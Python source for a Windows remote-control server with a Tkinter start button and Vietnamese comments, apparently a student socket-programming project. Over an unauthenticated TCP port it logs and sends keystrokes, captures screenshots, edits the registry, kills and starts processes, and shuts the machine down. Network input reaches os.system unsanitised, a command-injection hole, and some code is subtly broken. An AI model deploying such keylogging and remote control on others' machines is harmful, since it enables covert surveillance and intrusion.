import socket
import os
import tkinter as tk
import winreg
import time
from io import BytesIO
from pynput.keyboard import Key, Listener  
import pyautogui 

BUFF_SIZE = 4096 

def sendData(sock, msg):
    sock.sendall(bytes(msg, "utf8"))

def recvall(sock):
    data = b''
    while True:
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        if data:
            break
    return data.decode().strip()

def largerSend(sock, data):
    print(len(str(data)) + "\n")
    sock.sendall(bytes(str(len(data))),"utf8")
    sock.sendall(data)

def take(sock):
    img = pyautogui.screenshot() 
    fd = BytesIO()
    img.save(fd, "png")
    data = fd.getvalue()
    #print(data)
    sock.sendall(data)
    print(1)
    return

def takepic(sock):
    take(sock)
    print(1)
    while (True):
        s = recvall(sock)
        print(s)
        if (s == "TAKE"):
            take(sock)
            print(1)
        else:
            break
    return

def shutdown(sock):
    try:
        os.system('shutdown /s')
    except OSError:
        sendData(sock, "0")

def baseRegistryKey(link):
    a = ""
    id = link.index('\\')
    if (id >= 0):
        tmp = link[0:id]
        if (tmp == "HKEY_CLASSIES_ROOT"):
            a = winreg.HKEY_CLASSES_ROOT
        elif (tmp == "HKEY_CURRENT_USER"):
            a = winreg.HKEY_CURRENT_USER
        elif (tmp == "HKEY_LOCAL_MACHINE"):
            a = winreg.HKEY_LOCAL_MACHINE
        elif (tmp == "HKEY_USERS"):
            a = winreg.HKEY_USERS
        elif (tmp == "HKEY_CURRENT_CONFIG"):
            a = winreg.HKEY_CURRENT_CONFIG
    return a

def getValue(link, valueName):
    a = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0)
    except OSError:
        return "0"
    try:
        tmp = winreg.QueryValueEx(a, valueName)
        return tmp[0]
    except OSError:
        return "0"

def setValue(link, valueName, value, typeValue):
    try:
        a = baseRegistryKey(link)
        subKey = link[link.index('\\') + 1:len(link)]
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
    except OSError:
        return "0"
    kind = ""
    if (typeValue == "String"):
        kind = winreg.REG_SZ
    elif (typeValue == "Binary"):
        kind = winreg.REG_BINARY
    elif (typeValue == "DWORD"):
        kind = winreg.REG_DWORD
    elif (typeValue == "QWORD"):
        kind = winreg.REG_QWORD
    elif (typeValue == "Multi-String"):
        kind = winreg.REG_MULTI_SZ
    elif (typeValue == "Expandable String"):
        kind = winreg.REG_EXPAND_SZ
    else:
        return "0"
    try:
        winreg.SetValueEx(a, valueName, 0, kind, value)
        return "1"
    except OSError:
        return "0"

def deleteValue(link, valueName):
    try:
        a = baseRegistryKey(link)
        subKey = link[link.index('\\') + 1:len(link)]
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
    except OSError:
        return "0"
    try:
        winreg.DeleteValue(a, valueName)
        return "1"
    except OSError:
        return "0"

def deleteKey(link):
    key = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        winreg.DeleteKey(key, subKey)
        return "1"
    except OSError:
        return "0"

def createKey(link):
    key = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        winreg.CreateKey(key, subKey)
        return "1"
    except OSError:
        return "0"

def registry(sock):
    s = ""
    fs = open("fileReg.reg", "w")
    fs.close()
    while (True):
        s = recvall(sock)
        if (s == "REG"):
            data = recvall(sock)
            fin = open("fileReg.reg", "w")
            fin.write(data)
            fin.close()
            try:
                os.system('reg import fileReg.reg')
                sendData(sock, "1")
            except OSError:
                sendData(sock, "0")
        elif (s == "SEND"):
            data = recvall(sock)
            comp = data.strip().split('\n')
            option = comp[0]
            link = comp[1]
            a = baseRegistryKey(link)
            if (a == ""):
                s = "0"
            else:
                if (option == "Create key"):
                    s = createKey(link)
                elif (option == "Delete key"):
                    s = deleteKey(link)
                elif (option == "Get value"):
                    valueName = comp[2]
                    s = getValue(link, valueName)
                elif (option == "Set value"):
                    valueName = comp[2]
                    value = comp[3]
                    typeValue = comp[4]
                    s = setValue(link, valueName, value, typeValue)
                elif (option == "Delete value"):
                    valueName = comp[2]
                    s = deleteValue(link, valueName)
                else:
                    s = "0"
            sendData(sock, s)
        else:
            return

def printKeys(sock, keys):
    data = ""
    for key in keys:
        k = str(key).replace("'", "")
        if k == "Key.space":
            k = " "
        if k == "Key.enter":
            k = "\n "
        if k == "Key.tab":
            k = "\t "
        if k == "Key.backspace":
            k = ""
            data = data[0:len(data)-1]
        if k == "Tab":
            k = "    "
        if k == "Key.shift" or k == "Key.esc":
            k = ""
        data += k
    if (data == ""):
        data = "0"
    sendData(sock, data)
    #print(data)

def keylog(sock):
    keys = []

    def on_press(key):
        keys.append(key)

    def on_release(key):
        if key == Key.esc:
            return False

    isHook = False
    listener = Listener()
    while (True):
        s = recvall(sock)
        if (s == "PRINT"):
            printKeys(sock, keys)
            keys.clear()
        elif (s == "HOOK"):
            if (isHook == False):
                isHook = True
                listener = Listener(on_press = on_press, on_release = on_release)
                listener.start()
                sendData(sock, "1")
            else:
                sendData(sock, "0")
        elif (s == "UNHOOK"):
            if (isHook == True):
                isHook = False
                listener.stop()
                sendData(sock, "1")
            else:
                sendData(sock, "0")
        else:
            if (isHook == True):
                isHook = False
                listener.stop()
            return

def process(sock):
    while (True):
        s = recvall(sock)
        #print(s)
        if (s == "XEM"):
            process = os.popen('wmic process get Name, ProcessId, ThreadCount').read()
            sendData(sock, process)
            #print(process)
        elif (s == "KILL"):
            test = True
            while (test):
                s1 = recvall(sock)
                #print(s1)
                if (s1 == "KILLID"):
                    id = recvall(sock)
                    #print(id)
                    if (id != ""):
                        try:
                            listID = os.popen('wmic process get ProcessId').read()
                            listID = listID.split('\n')
                            listID = [id for id in listID if (id != '')]
                            for i in range (0, len(listID)):
                                listID[i] = listID[i].strip()
                            if (id not in listID):
                                sendData(sock, "0")
                                #print("Lỗi\n")
                            else:
                                os.system('wmic process where ProcessId=%a delete'%(id))
                                sendData(sock, "1")
                                #print("Đã diệt process\n")
                        except:
                            sendData(sock, "0")
                            #print("Lỗi\n")  
                else:
                    test = False
        elif (s == "START"):
            test = True
            while (test):
                s = recvall(sock)
                if (s == "STARTID"):
                    processName = recvall(sock)
                    processName += '.exe'
                    processName = "\'" + processName + "\'"
                    try:
                        os.system('wmic process call create %s'%(processName))
                        sendData(sock, "1")
                        #print("Process đã được bật\n")
                    except:
                        sendData(sock, "0")
                        #print("Lỗi\n")
                else:
                    test = False
        else:
            break


def application(sock):
    while (True):
        s = recvall(sock)
        if (s == "XEM"):
            listApp = os.popen('powershell "gps | where {$_.MainWindowTitle } | select name, id, {$_.Threads.Count}').read()
            sendData(sock, listApp + '\n')
            #print(listApp + '\n')
        elif (s == "KILL"):
            test = True
            while (test):
                s = recvall(sock)
                if (s == "KILLID"):
                    id = recvall(sock)
                    if (id != ""):
                        try:
                            listID = os.popen('powershell "gps | where {$_.MainWindowTitle } | select id').read()
                            listID = listID.split('\n')
                            listID = [id for id in listID if (id != '')]
                            for i in range (0, len(listID)):
                                listID[i] = listID[i].strip()
                            if (id not in listID):
                                sendData(sock, "0")
                                #print("Lỗi\n")
                            else:
                                os.system('wmic process where ProcessId=%a delete'%(id))
                                sendData(sock, "1")
                                #print("Đã diệt chương trình\n")
                        except:
                            sendData(sock, "0")  
                            #print("Lỗi\n")
                else:
                    test = False
        elif (s == "START"):
            test = True
            while (test):
                s = recvall(sock)
                if (s == "STARTID"):
                    appName = recvall(sock)
                    appName += '.exe'
                    appName = "\'" + appName + "\'"
                    try:
                        os.system('wmic process call create %s'%(appName))
                        sendData(sock, "1")
                        #print("Chương trình đã bật\n")
                    except:
                        sendData(sock, "0")
                        #print("Lỗi\n")
                else:
                    test = False
        else:
            break

hostname = socket.gethostname()
HOST = socket.gethostbyname(hostname) 
PORT = 65432   

def buttonServer_click():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        try:
            #print('Connected by', addr)
            str = ""
            while True:
                #time.sleep(1)
                str = recvall(conn)
                #print(str)
                if (str == "KEYLOG"):
                    keylog(conn)
                elif (str == "REGISTRY"):
                    registry(conn)
                elif (str == "SHUTDOWN"):
                    shutdown(conn)
                elif (str == "TAKEPIC"):
                    takepic(conn)
                elif (str == "PROCESS"):
                    process(conn)
                elif (str == "APPLICATION"):
                    application(conn)
                elif (str == "QUIT"):
                    conn.close()
                    break
                else: 
                    continue
        except KeyboardInterrupt:
            conn.close()

def run_server():
    window = tk.Tk()
    window.title("Form1")

    frame1 = tk.Frame(master=window, width=150, height=150)
    frame1.pack()

    button = tk.Button(master=window, text="Mở server", width=10, height=5, command=buttonServer_click)
    button.place(x=35, y=30)

    window.mainloop()

run_server()